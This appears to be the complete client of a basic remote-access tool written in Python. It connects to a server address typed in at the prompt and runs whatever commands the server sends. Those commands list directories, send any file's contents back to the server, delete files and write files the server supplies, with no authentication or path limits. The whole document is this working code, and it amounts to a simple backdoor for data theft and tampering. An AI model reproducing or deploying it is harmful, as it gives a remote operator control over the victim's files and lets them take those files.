import os
import socket

# Connection Initialisation [Phase 1]
s    = socket.socket()
port = 8080
host = input(str("Please Enter the Server Address : "))
s.connect((host,port))
print("")
print("Connected to the Server Successfully")
print("")

# Command Recv and execution [Phase 2]

while 1:
    command = s.recv(1024)
    command = command.decode()
    print(f"[+] Command recieved {command}")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("[+] [view_cwd] has been Executed Successfully")
        print("")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("[+] [custom_dir] has been Executed Successfully")
        print("")

    elif command == "download_files":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        file = open(user_input,'rb')
        file_data = file.read()
        file.close()
        s.send(file_data)
        print("[+] [download_files] has been Executed Successfully")
        print("")

    elif command == "delete_files":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        os.remove(user_input)
        print("[+] [delete_files] has been Executed Successfully")
        print("")

    elif command == "send_files":
        file_data = s.recv(20000)
        file_name = s.recv(5000)
        new_file = open(file_name, 'wb')
        new_file.write(file_data)
        new_file.close()
        print("[+] [send_files] has been executed Successfully")
        print("")



    else:
        print("")
        print("[-] Command not Recognised")
        print("")
